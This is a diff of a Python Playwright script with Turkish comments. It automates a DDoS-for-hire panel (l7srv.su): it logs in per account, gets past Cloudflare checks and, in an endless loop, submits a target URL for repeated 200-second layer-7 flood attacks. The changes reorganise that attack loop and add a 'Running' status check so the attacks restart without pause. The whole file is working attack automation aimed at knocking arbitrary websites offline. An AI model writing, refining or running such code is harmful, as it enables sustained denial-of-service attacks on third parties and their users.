@@ -78,6 +78,7 @@ def attack_worker(account):
                 print(f"[{username}] 🔐 Giriş sayfasına gidiliyor...")
                 try:
                     page.goto("https://l7srv.su/login", timeout=120000, wait_until="domcontentloaded")
+                    
                     if "cf-browser-verification" in page.url or "challenge" in page.url:
                         print(f"[{username}] ⚡ Cloudflare challenge algılandı, geçilmesi bekleniyor...")
                         page.wait_for_timeout(15000)
@@ -89,6 +90,7 @@ def attack_worker(account):
                     page.fill("#password", password)
                     page.wait_for_selector("#loginNextBtn:not([disabled])", timeout=15000)
                     page.click("#loginNextBtn")
+                    
                     page.wait_for_url(lambda url: "/dash" in url, timeout=90000)
                     print(f"[{username}] ✅ Giriş başarılı!")
                     consecutive_errors = 0
@@ -119,54 +121,60 @@ def attack_worker(account):
                     time.sleep(wait_time)
                     continue
 
-                # ---------- ANA SALDIRI DÖNGÜSÜ (sonsuz) ----------
+                # ---------- ANA SALDIRI DÖNGÜSÜ (SONSUZ) ----------
                 while True:
                     try:
-                        # Formu doldur ve saldırıyı başlat
+                        # Sayfayı yenile ve elementlerin yüklenmesini bekle
+                        page.reload(wait_until="domcontentloaded")
+                        page.wait_for_timeout(2000)
+                        
+                        # #layer_7'ye tıkla
+                        page.wait_for_selector("#layer_7", timeout=15000)
+                        page.locator("#layer_7").click()
+                        page.wait_for_timeout(1000)
+                        
+                        # Formu doldur
                         page.wait_for_selector("#l7host", timeout=15000)
                         page.fill("#l7host", target_url)
                         page.select_option("#l7method", value=method)
-                        time_value = 200  # Sabit 200 saniye
-                        page.fill("#l7time", str(time_value))
+                        page.fill("#l7time", "200")  # Sabit 200 saniye
+                        
+                        # Başlat butonuna tıkla
+                        page.wait_for_selector("#l7btn", timeout=15000)
                         page.click("#l7btn")
-                        print(f"[{username}] 🔥 Saldırı başladı | {time_value} sn")
+                        print(f"[{username}] 🔥 Saldırı başladı | 200 sn")
                         consecutive_errors = 0
 
-                        # Saldırı bitene kadar bekle
+                        # Saldırı durumu takibi
                         while True:
-                            # Saldırı bitti mi kontrol et
+                            # Sayfadaki saldırı durumunu kontrol et
                             no_attacks = page.locator(".dataTables_empty:has-text('No running attacks')")
                             if no_attacks.count() > 0 and no_attacks.is_visible():
                                 print(f"[{username}] ⏰ Saldırı bitti.")
                                 break
-                            # Süre doldu mu kontrol et
+                            
                             expire_cell = page.locator("#attacks-table tbody tr td:nth-child(4) span").first
                             if expire_cell.count() > 0:
                                 expire_text = expire_cell.text_content().strip()
                                 if expire_text in ["00:00:00", "0"] or expire_text.lower() == "expired":
                                     print(f"[{username}] ⏰ Süre doldu.")
                                     break
+                            
+                            # Saldırı devam ediyor mu kontrol et
+                            running_badge = page.locator(".stats-content .badge:has-text('Running')").first
+                            if running_badge.count() == 0:
+                                print(f"[{username}] ⏰ Attack bitti (Running yok).")
+                                break
+                            
                             time.sleep(2)
-
-                        # ---------- SAYFAYI YENİLE VE TEKRAR HAZIRLAN ----------
-                        print(f"[{username}] 🔄 Sayfa yenileniyor ve yeniden başlatılıyor...")
-                        page.reload(wait_until="domcontentloaded")
-                        page.wait_for_timeout(3000)
-                        # #layer_7 butonunu bekle ve tıkla
-                        page.wait_for_selector("#layer_7", timeout=15000)
-                        page.locator("#layer_7").click()
-                        page.wait_for_timeout(1000)
-                        # Döngü başa sarar, form yeniden doldurulur
 
                     except Exception as inner_err:
                         print(f"[{username}] ⚠️ Adım hatası: {inner_err}")
                         consecutive_errors += 1
                         try:
+                            # Sayfayı yenile ve tekrar dene
                             page.reload(wait_until="domcontentloaded")
-                            page.wait_for_timeout(5000)
-                            # Eğer sayfa yüklenmezse #layer_7'yi tekrar dene
-                            if page.locator("#layer_7").count() > 0:
-                                page.locator("#layer_7").click()
+                            page.wait_for_timeout(3000)
                         except:
                             pass
                         continue
